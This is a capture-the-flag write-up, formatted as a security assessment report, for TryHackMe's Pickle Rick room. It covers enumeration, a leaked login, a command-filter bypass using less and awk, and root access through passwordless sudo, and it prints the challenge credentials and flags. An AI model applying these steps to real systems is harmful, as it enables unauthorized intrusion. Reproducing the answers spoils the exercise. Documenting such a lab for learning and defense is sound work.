# Security Assessment Report — TryHackMe: Pickle Rick

## 1. Executive Summary

The Pickle Rick challenge is a web application security and Linux privilege escalation exercise hosted on TryHackMe. The assessment focused on identifying exposed services, enumerating the web application, discovering authentication information, obtaining command execution, and retrieving three hidden ingredients from the target filesystem.

The assessment began with network reconnaissance using Nmap. The web application was subsequently enumerated using a browser, cURL, and Gobuster. Source-code inspection revealed a username, while a publicly accessible `robots.txt` file exposed a password clue. These findings enabled successful authentication to the application's command portal.

The portal executed commands under the `www-data` account. Although the application blocked certain commands, alternative utilities could still read files. Filesystem enumeration revealed the first two ingredients. A subsequent privilege assessment identified unrestricted passwordless sudo privileges for `www-data`, allowing commands to be executed as root. This provided access to the final ingredient.

**Overall conclusion:** The target contained multiple weaknesses that combined to enable complete root-level compromise within the authorized CTF environment. The most critical finding was unrestricted passwordless sudo access for the web-server account.

## 2. Assessment Details

| Field | Details |
|---|---|
| Challenge | Pickle Rick |
| Platform | TryHackMe |
| Target IP | `10.49.131.103` |
| Attacker environment | Kali Linux |
| Assessment type | Web application security and Linux privilege escalation |
| Primary tools | Nmap, cURL, Gobuster, Linux shell utilities |
| Initial execution account | `www-data` |
| Final privilege level | `root` |
| Assessment outcome | All three ingredients recovered |

### 2.1 Assessment Scope

The assessment was limited to the assigned TryHackMe target and the services and resources required to complete the challenge.

Activities included:

- Network and service enumeration.
- Web application and directory discovery.
- Authentication clue identification and validation.
- Assessment of application command execution.
- Filesystem enumeration.
- Privilege configuration assessment.
- Retrieval of the three challenge ingredients.

No unrelated systems were included in the assessment.

## 3. Objectives

The assessment had the following objectives:

1. Identify exposed network services.
2. Discover publicly accessible web application resources.
3. Identify authentication information from available clues.
4. Gain access to the authenticated portal.
5. Determine the execution context of the portal.
6. Locate the three required ingredient files.
7. Identify and validate privilege-escalation opportunities.
8. Document the security findings and recommend remediation.

All primary challenge objectives were achieved.

## 4. Methodology

The assessment followed a structured penetration-testing workflow.

### 4.1 Network Reconnaissance

Nmap was used to identify open ports and detect running services.

Command executed:

```bash
nmap -sC -sV -oN nmap.txt 10.49.131.103
```

The scan identified two open TCP ports.

| Port | Service | Detected Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu |
| 80/tcp | HTTP | Apache httpd 2.4.41 |

The HTTP service was selected as the primary investigation target because it hosted the challenge web application.

**Observation:** The exposed web server provided an accessible entry point for further enumeration.

### 4.2 Web Application Enumeration

The homepage was retrieved using cURL and inspected for comments and other potentially sensitive information.

Command:

```bash
curl -s http://10.49.131.103 -o index.html
```

The HTML source contained a comment disclosing the username:

```html
<!--
  Note to self, remember username!

  Username: R1ckRul3s
-->
```

The publicly accessible `robots.txt` file was then inspected:

```bash
curl -i http://10.49.131.103/robots.txt
```

Its contents were:

```text
Wubbalubbadubdub
```

This value was identified as a candidate password clue and subsequently validated through the login interface.

#### Directory enumeration

Gobuster was used to identify hidden directories and files.

```bash
gobuster dir \
  -u http://10.49.131.103 \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

Relevant discoveries included:

| Endpoint | Status | Observation |
|---|---|---|
| `/index.html` | 200 | Homepage |
| `/login.php` | 200 | Login interface |
| `/portal.php` | 302 | Redirected unauthenticated requests to the login page |
| `/denied.php` | 302 | Redirected to the login page |
| `/robots.txt` | 200 | Exposed a password clue |
| `/assets/` | 301 | Static resource directory |

**Result:** The investigation identified the login page and the protected portal.

### 4.3 Authentication

The username and password candidate discovered during enumeration were tested through the normal login interface.

| Field | Validated value |
|---|---|
| Username | `R1ckRul3s` |
| Password | `Wubbalubbadubdub` |

Authentication succeeded, allowing access to the portal.

**Security observation:** Information disclosed through the homepage source and `robots.txt` was sufficient to compromise the application's authentication.

### 4.4 Command Execution Assessment

The authenticated portal accepted operating-system commands.

The following commands were used to determine the execution context:

```bash
whoami
pwd
ls -la
```

Observed results:

```text
www-data
```

```text
/var/www/html
```

The directory listing revealed:

```text
Sup3rS3cretPickl3Ingred.txt
clue.txt
login.php
portal.php
```

These results established that the portal executed commands as `www-data` from the web application's directory.

#### Command filtering

An attempt to read the first ingredient with `cat` returned a custom message indicating that the command was disabled.

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

However, alternative utilities successfully displayed the file:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

```bash
awk '{print}' Sup3rS3cretPickl3Ingred.txt
```

**Result:** The application restricted selected command names without preventing equivalent file-reading operations. This demonstrated that command filtering was insufficient to protect the underlying filesystem.

### 4.5 First Ingredient Retrieval

The first ingredient was obtained from:

```text
/var/www/html/Sup3rS3cretPickl3Ingred.txt
```

Command:

```bash
less Sup3rS3cretPickl3Ingred.txt
```

Recovered value:

```text
mr. meeseek hair
```

**Status:** Successfully retrieved.

### 4.6 Second Ingredient Retrieval

The application provided a clue in `clue.txt`:

```text
Look around the file system for the other ingredient.
```

The home directory was enumerated:

```bash
ls -la /home/rick
```

This revealed a file named `second ingredients`.

The file was read using:

```bash
less "/home/rick/second ingredients"
```

Recovered value:

```text
1 jerry tear
```

**Status:** Successfully retrieved.

### 4.7 Privilege Escalation Assessment

After enumerating the filesystem and identifying access restrictions, the current account's sudo privileges were examined.

Command:

```bash
sudo -l
```

The target returned:

```text
User www-data may run the following commands on ip-10-49-131-103:
    (ALL) NOPASSWD: ALL
```

This finding established that the `www-data` account could execute arbitrary commands as any user, including root, without a password.

Elevated access was verified with:

```bash
sudo whoami
```

Observed output:

```text
root
```

**Result:** Root-level command execution was available because of unrestricted passwordless sudo permissions.

### 4.8 Third Ingredient Retrieval

The root directory was enumerated using elevated privileges:

```bash
sudo ls -la /root
```

The listing revealed:

```text
3rd.txt
```

The file was read using:

```bash
sudo less /root/3rd.txt
```

Recovered value:

```text
3rd ingredients: fleeb juice
```

**Status:** Successfully retrieved.

## 5. Results and Evidence

### 5.1 Challenge Objectives

| Objective | Result |
|---|---|
| Identify exposed services | Completed |
| Enumerate the web application | Completed |
| Discover authentication information | Completed |
| Authenticate to the portal | Completed |
| Establish command execution context | Completed |
| Retrieve first ingredient | Completed |
| Retrieve second ingredient | Completed |
| Identify privilege misconfiguration | Completed |
| Retrieve third ingredient | Completed |

### 5.2 Recovered Ingredients

| No. | Ingredient | File Location |
|---|---|---|
| 1 | `mr. meeseek hair` | `/var/www/html/Sup3rS3cretPickl3Ingred.txt` |
| 2 | `1 jerry tear` | `/home/rick/second ingredients` |
| 3 | `fleeb juice` | `/root/3rd.txt` |

All three ingredients were recovered from the target.

## 6. Security Findings

### Finding 1 — Information Disclosure

**Severity:** High in the context of this challenge

**Evidence:**
- The homepage HTML source exposed a username.
- The public `robots.txt` file exposed a password clue.
- The discovered values enabled successful authentication.

**Impact:**

An attacker could inspect publicly accessible resources to obtain authentication information. If the exposed information is valid, this can result in unauthorized access to protected application functionality.

**Recommendation:**

Remove credentials and sensitive operational information from HTML comments and public text files. Store secrets in appropriate server-side configuration or secret-management systems. Use unique, strong passwords and multifactor authentication where appropriate.

### Finding 2 — Unrestricted Command Execution Through the Web Application

**Severity:** Critical

**Evidence:**

The authenticated portal accepted operating-system commands and executed them as `www-data`.

**Impact:**

An attacker who gains access to this functionality can execute commands within the web-server account's permission boundary, inspect accessible files, and potentially compromise the entire host if additional privilege weaknesses exist.

**Recommendation:**

Remove arbitrary shell execution from the web application. Where external commands are genuinely necessary, use fixed operations, strict input validation, safe argument handling, and a dedicated low-privilege service account. Enforce server-side authorization and monitor command execution.

### Finding 3 — Ineffective Command Filtering

**Severity:** High in the context of the challenge

**Evidence:**

The portal blocked `cat`, but `less` and `awk` could read the same file.

**Impact:**

Blocking selected command names does not prevent the underlying operation when alternative utilities are available. The restriction provides a false sense of security while leaving file access possible.

**Recommendation:**

Do not use command-name blacklists as a security boundary. Eliminate unrestricted shell execution or expose only explicitly authorized operations through a carefully designed interface. Apply filesystem permissions independently of application-level filtering.

### Finding 4 — Unrestricted Passwordless Sudo

**Severity:** Critical

**Evidence:**

The sudo configuration allowed:

```text
(ALL) NOPASSWD: ALL
```

The `www-data` account successfully executed a command as root.

**Impact:**

Any attacker capable of executing commands as `www-data` can immediately obtain root-level command execution. This removes the privilege boundary between the web application and the operating system.

**Recommendation:**

Remove unrestricted sudo permissions from `www-data`. Review `/etc/sudoers` and the files under `/etc/sudoers.d/` using validated administrative procedures. If sudo access is necessary, grant only specific commands, required arguments, and the minimum required target user. Prefer dedicated service accounts without administrative privileges.

## 7. Attack Path Summary

The compromise followed this sequence:

1. **Reconnaissance:** Nmap identified the exposed HTTP and SSH services.
2. **Enumeration:** The homepage source and `robots.txt` revealed authentication clues.
3. **Authentication:** The discovered credentials enabled access to the portal.
4. **Command execution:** The portal executed commands as `www-data`.
5. **Filesystem discovery:** The first and second ingredients were found in the web directory and Rick's home directory.
6. **Privilege assessment:** `sudo -l` exposed unrestricted passwordless sudo access.
7. **Privilege escalation:** Commands were executed as root.
8. **Final retrieval:** The root-owned file `/root/3rd.txt` provided the third ingredient.

The key relationship was the combination of application command execution and unrestricted sudo privileges.

## 8. Remediation Plan

The following actions are recommended in order of priority:

| Priority | Action | Expected Outcome |
|---|---|---|
| Critical | Remove unrestricted passwordless sudo from the web-server account | Prevent direct root compromise |
| Critical | Eliminate arbitrary shell execution from the web portal | Remove the primary command-execution path |
| High | Remove exposed credentials and sensitive clues | Reduce information disclosure |
| High | Enforce least-privilege filesystem permissions | Limit access to sensitive files |
| High | Replace command filtering with secure application design | Prevent bypasses using alternative utilities |
| Medium | Strengthen authentication and session management | Reduce unauthorized portal access |
| Medium | Add monitoring for suspicious commands and privilege use | Improve detection and response |
| Medium | Retest the application after remediation | Verify that vulnerabilities are fixed |

## 9. Lessons Learned

This challenge demonstrates several important security principles:

- **Information disclosure matters:** Comments and public text files can expose clues that undermine authentication.
- **Enumeration must be systematic:** Source inspection, directory discovery, and filesystem searches each provided information needed to progress.
- **Command execution is dangerous:** A web application that executes shell commands can expose the host's files and operating-system functionality.
- **Blacklists are not security boundaries:** Blocking one command does not prevent equivalent actions through other utilities.
- **Least privilege is essential:** A web-server account should not have unrestricted administrative privileges.
- **Privilege misconfiguration amplifies impact:** The combination of web command execution and unrestricted sudo transformed limited application access into root-level compromise.

## 10. Conclusion

The Pickle Rick assessment successfully recovered all three challenge ingredients and identified multiple security weaknesses.

The investigation began with network reconnaissance and web application enumeration. Publicly accessible resources exposed authentication clues, which enabled access to a command-execution portal. The portal operated as `www-data`, and inadequate command filtering permitted file-reading operations. Filesystem enumeration revealed two ingredients, while unrestricted passwordless sudo allowed access to the root-owned file containing the third.

The most critical issue was the absence of a proper privilege boundary for the web-server account. Removing unrestricted sudo privileges and eliminating arbitrary command execution would substantially reduce the risk of full system compromise.

The challenge was completed successfully within the authorized TryHackMe environment.

---

**Report status:** Completed  
**Assessment result:** All three ingredients recovered  
**Primary security concern:** Web command execution combined with unrestricted passwordless sudo  
**Recommended next step:** Apply the remediation measures and repeat the relevant tests to validate the fixes.